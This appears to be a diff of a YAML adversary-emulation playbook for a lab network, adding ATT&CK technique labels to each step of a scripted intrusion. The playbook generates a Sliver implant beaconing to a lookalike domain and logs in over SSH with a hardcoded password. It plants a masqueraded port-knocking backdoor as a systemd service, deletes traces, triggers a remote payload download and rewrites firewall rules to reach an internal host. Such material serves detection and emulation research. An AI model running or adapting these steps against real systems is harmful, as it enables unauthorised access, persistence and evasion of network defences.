@@ -10,22 +10,32 @@ vars:
   $FIREWALL_ADDRESS: 172.17.100.254
   $LINUXSHARE_ADDRESS: 192.168.100.23
 
-
-
 commands:
   - type: sliver
     cmd: "generate_implant"
     c2url: "https://faaacebook.com"
     name: "sliver1"
+    metadata:
+      techniques: "T1071.001"
+      tactic: "Command and Control"
+      technique_name: "Application Layer Protocol: Web Protocols"
 
   - type: sliver
     cmd: start_https_listener
     host: 0.0.0.0
     port: 443
+    metadata:
+      techniques: "T1071.001"
+      tactic: "Command and Control"
+      technique_name: "Application Layer Protocol: Web Protocols"
 
   - type: shell
     cmd: sshpass -p 'rambo' scp -o StrictHostKeyChecking=no -o ProxyCommand="sshpass -p 'rambo' ssh -o StrictHostKeyChecking=no -p 10022 john@$SERVER_ADDRESS nc $FIREWALL_ADDRESS 22" /home/aecid/auditf.tar.gz john@$FIREWALL_ADDRESS:/tmp/auditf.tar.gz
-  
+    metadata:
+      techniques: "T1078.003,T1105,T1205.001"
+      tactic: "Initial Access,Lateral Movement,Defense Evasion"
+      technique_name: "Valid Accounts: Local Accounts,Ingress Tool Transfer,Traffic Signaling: Port Knocking"
+
   - type: ssh
     creates_session: "foothold"
     username: john
@@ -33,11 +43,19 @@ commands:
     hostname: $SERVER_ADDRESS
     port: 10022
     cmd: id
+    metadata:
+      techniques: "T1078.003"
+      tactic: "Initial Access"
+      technique_name: "Valid Accounts: Local Accounts"
 
   - type: ssh
     session: foothold
     cmd: "ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password john@$FIREWALL_ADDRESS\n"
     interactive: True
+    metadata:
+      techniques: "T1078.003"
+      tactic: "Lateral Movement"
+      technique_name: "Valid Accounts: Local Accounts"
   
   - type: sleep
     seconds: 2
@@ -46,11 +64,19 @@ commands:
     session: foothold
     cmd: "rambo\n"
     interactive: True
+    metadata:
+      techniques: "T1078.003"
+      tactic: "Lateral Movement"
+      technique_name: "Valid Accounts: Local Accounts"
 
   - type: ssh
     session: foothold
     cmd: "sudo -i\n"
     interactive: True
+    metadata:
+      techniques: "T1548.003"
+      tactic: "Privilege Escalation"
+      technique_name: "Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
   
   - type: sleep
     seconds: 2
@@ -59,16 +85,28 @@ commands:
     session: foothold
     cmd: "rambo\n"
     interactive: True
+    metadata:
+      techniques: "T1548.003"
+      tactic: "Privilege Escalation"
+      technique_name: "Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
   
   - type: ssh
     session: foothold
     cmd: "sudo tar -xzf /tmp/auditf.tar.gz -C /usr/bin\n"
     interactive: True
+    metadata:
+      techniques: "T1036.005,T1205.001"
+      tactic: "Defense Evasion"
+      technique_name: "Masquerading: Match Legitimate Name or Location,Traffic Signaling: Port Knocking"
 
   - type: ssh
     session: foothold
     cmd: "rm /tmp/auditf.tar.gz\n"
     interactive: True
+    metadata:
+      techniques: "T1070.004"
+      tactic: "Defense Evasion"
+      technique_name: "Indicator Removal: File Deletion"
 
   - type: ssh
     session: foothold
@@ -91,35 +129,60 @@ commands:
     cmd: "sudo chmod +x system-verify.sh \n"
     interactive: True
 
+#   auditf.service is a service that starts the portknocking sofware, the portknocking binary is named auditf
   - type: ssh
     cmd: "vim /etc/systemd/system/auditf.service\n"
     interactive: True
     session: foothold
+    metadata:
+      techniques: "T1543.002"
+      tactic: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: ":inoremap jj <ESC>\n"
     interactive: True
     session: foothold
+    metadata:
+      techniques: "T1543.002"
+      tactic: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: "o"
     interactive: True
     session: foothold
+    metadata:
+      techniques: "T1543.002"
+      tactic: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: "[Unit]\nDescription=Run auditf on boot\n\n[Service]\nExecStart=/usr/bin/auditf\nWorkingDirectory=/usr/bin\nRestart=on-failure\nType=simple\n\n[Install]\nWantedBy=multi-user.target\n"
     interactive: True
     session: foothold
+    metadata:
+      techniques: "T1543.002"
+      tactic: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: "jj"
     interactive: True
     session: foothold
+    metadata:
+      techniques: "T1543.002"
+      tactic: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: ssh
     cmd: ":wq!\n"
     interactive: True
     session: foothold
+    metadata:
+      techniques: "T1543.002"
+      tactic: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: sleep
     seconds: 2
@@ -128,6 +191,10 @@ commands:
     session: foothold
     cmd: "sudo systemctl daemon-reload\n"
     interactive: True
+    metadata:
+      techniques: "T1543.002"
+      tactic: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: sleep
     seconds: 5
@@ -136,6 +203,10 @@ commands:
     session: foothold
     cmd: "sudo systemctl enable auditf.service\n"
     interactive: True
+    metadata:
+      techniques: "T1543.002"
+      tactic: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: sleep
     seconds: 3
@@ -144,6 +215,10 @@ commands:
     session: foothold
     cmd: "sudo systemctl start auditf.service\n"
     interactive: True
+    metadata:
+      techniques: "T1543.002"
+      tactic: "Persistence"
+      technique_name: "Create or Modify System Process: Systemd Service"
 
   - type: sleep
     seconds: 5
@@ -161,12 +236,19 @@ commands:
   - type: sleep
     seconds: 5
 
+#   this executes the port knocking sequence, which triggers the script system-verify.sh, which downloads and executes the sliver malware
+#   the sliver malware is saved as "systemp" in /usr/bin
   - type: shell
     cmd: /home/aecid/knock-cli -c knock.yaml -r knock-firewall
+    metadata:
+      techniques: "T1205.001,T1071.001,T1036.005"
+      tactic: "Defense Evasion,Persistence,Command and Control"
+      technique_name: "Traffic Signaling: Port Knocking,Application Layer Protocol: Web Protocols,Masquerading: Match Legitimate Name or Location"
 
   - type: sleep
     seconds: 5
 
+# Attacker modifies iptables on Firewall so that DMZ host is allowed to connect to a server (linuxshare) in the lan
   - type: sliver-session
     cmd: execute
     exe: sudo
@@ -176,7 +258,10 @@ commands:
       - '/# Kafka Ports/i\ACCEPT dmz lan:$LINUXSHARE tcp  22  -   -   -' 
       - /etc/shorewall/rules
     session: sliver1
-
+    metadata:
+      techniques: "T1599"
+      tactic: "Defense Evasion"
+      technique_name: "Network Boundary Bridging"
 
   - type: sliver-session
     cmd: execute
@@ -184,6 +269,10 @@ commands:
     args:
       - reload
     session: sliver1
+    metadata:
+      techniques: "T1599"
+      tactic: "Defense Evasion"
+      technique_name: "Network Boundary Bridging"
 
   - type: ssh
     creates_session: "foothold2"
@@ -192,11 +281,19 @@ commands:
     hostname: $SERVER_ADDRESS
     port: 10022
     cmd: id
+    metadata:
+      techniques: "T1078.003"
+      tactic: "Initial Access"
+      technique_name: "Valid Accounts: Local Accounts"
 
   - type: ssh
     session: foothold2
     cmd: "ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password john@$LINUXSHARE_ADDRESS\n"
     interactive: True
+    metadata:
+      techniques: "T1078.003"
+      tactic: "Lateral Movement"
+      technique_name: "Valid Accounts: Local Accounts"
 
   - type: sleep
     seconds: 5
@@ -205,6 +302,10 @@ commands:
     session: foothold2
     cmd: "rambo\n"
     interactive: True
+    metadata:
+      techniques: "T1078.003"
+      tactic: "Lateral Movement"
+      technique_name: "Valid Accounts: Local Accounts"
 
   - type: sleep
     seconds: 1
@@ -213,7 +314,10 @@ commands:
     session: foothold2
     cmd: "hostname\n"
     interactive: True
-
+    metadata:
+      techniques: "T1082"
+      tactic: "Discovery"
+      technique_name: "System Information Discovery"
 
 
 
